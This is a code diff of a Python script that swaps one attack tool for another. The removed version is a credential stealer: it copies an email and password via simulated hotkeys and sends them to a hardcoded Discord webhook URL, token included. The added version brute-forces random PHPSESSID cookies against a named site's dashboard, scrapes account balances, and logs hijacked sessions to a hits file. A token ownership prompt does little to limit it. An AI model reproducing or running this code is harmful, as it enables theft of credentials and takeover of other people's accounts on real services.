@@ -1,45 +1,71 @@
-import pyautogui
-import time
+#!/usr/bin/env python3
+"""
+Auto PHPSESSID generator + checker
+- Generates random tokens continuously
+- Checks target site for balance snippet
+- Saves hits to hits.txt
+"""
+
 import requests
-import pyperclip
+import random
+import string
+import time
+from urllib.parse import urlparse
 
-# Replace with your Discord webhook URL
-DISCORD_WEBHOOK_URL = 'https://discord.com/api/webhooks/1416794325299232818/0EihutE_oAC_uGN-4Rzz-aFb0XLsi0ifONfrETrBQk4UC-5VW0df2D3TDQCBU7-B3kVp'
+# === CONFIG ===
+URL = "https://www.harikiproject.site/dashboard.php"
+HITS_FILE = "hits.txt"
+TARGET_LEFT = '<div class="stat-value">'
+TARGET_RIGHT = '</div>'
+TOKEN_LENGTH = 26
+RATE_SLEEP = 2  # seconds between requests
+USER_AGENT = "auto-session-generator/1.0"
 
-def send_to_discord(email, password):
-    payload = {
-        'content': f'Email: {email}\nPassword: {password}'
-    }
-    headers = {
-        'Content-Type': 'application/json'
-    }
-    response = requests.post(DISCORD_WEBHOOK_URL, json=payload, headers=headers)
-    if response.status_code != 204:
-        print(f'Failed to send credentials to Discord: {response.status_code} {response.text}')
+# Interactive confirmation
+parsed = urlparse(URL)
+host = parsed.hostname or ""
+if not host:
+    print("Invalid URL in script. Exiting.")
+    exit()
 
-def grab_credentials():
-    # Simulate pressing Ctrl+Shift+E to open the email field (example for a specific application)
-    pyautogui.hotkey('ctrl', 'shift', 'e')
-    time.sleep(1)  # Wait for the field to focus
+print("Target URL:", URL)
+confirm = input(f"Type the exact hostname to confirm you own/control it (--> {host}): ").strip()
+if confirm != host:
+    print("Confirmation did not match. Aborting.")
+    exit()
 
-    # Simulate copying the email
-    pyautogui.hotkey('ctrl', 'c')
-    time.sleep(0.5)  # Short delay to ensure clipboard update
-    email = pyperclip.paste()
-    time.sleep(1)
+print(f"Starting generator & checker for {host} ...\n")
 
-    # Simulate pressing Ctrl+Shift+P to open the password field (example for a specific application)
-    pyautogui.hotkey('ctrl', 'shift', 'p')
-    time.sleep(1)  # Wait for the field to focus
+def generate_token(length=TOKEN_LENGTH):
+    alphabet = string.ascii_lowercase + string.digits
+    return ''.join(random.choice(alphabet) for _ in range(length))
 
-    # Simulate copying the password
-    pyautogui.hotkey('ctrl', 'c')
-    time.sleep(0.5)  # Short delay to ensure clipboard update
-    password = pyperclip.paste()
-    time.sleep(1)
+def extract_balance(html):
+    try:
+        start = html.index(TARGET_LEFT) + len(TARGET_LEFT)
+        end = html.index(TARGET_RIGHT, start)
+        return html[start:end].strip()
+    except ValueError:
+        return None
 
-    return email, password
+session = requests.Session()
+session.headers.update({"User-Agent": USER_AGENT})
 
-if __name__ == '__main__':
-    email, password = grab_credentials()
-    send_to_discord(email, password)
+while True:
+    token = generate_token()
+    cookies = {"PHPSESSID": token}
+    try:
+        resp = session.get(URL, cookies=cookies, timeout=10, allow_redirects=True)
+        if resp.status_code == 200:
+            balance = extract_balance(resp.text)
+            if balance:
+                print(f"[HIT] Token={token} Balance={balance}")
+                with open(HITS_FILE, "a", encoding="utf-8") as f:
+                    f.write(f"{token} = {balance}\n")
+            else:
+                print(f"[MISS] Token={token}")
+        else:
+            print(f"[ERR] Token={token} Status={resp.status_code}")
+    except requests.RequestException as e:
+        print(f"[EXCEPTION] Token={token} Error={e}")
+    time.sleep(RATE_SLEEP)
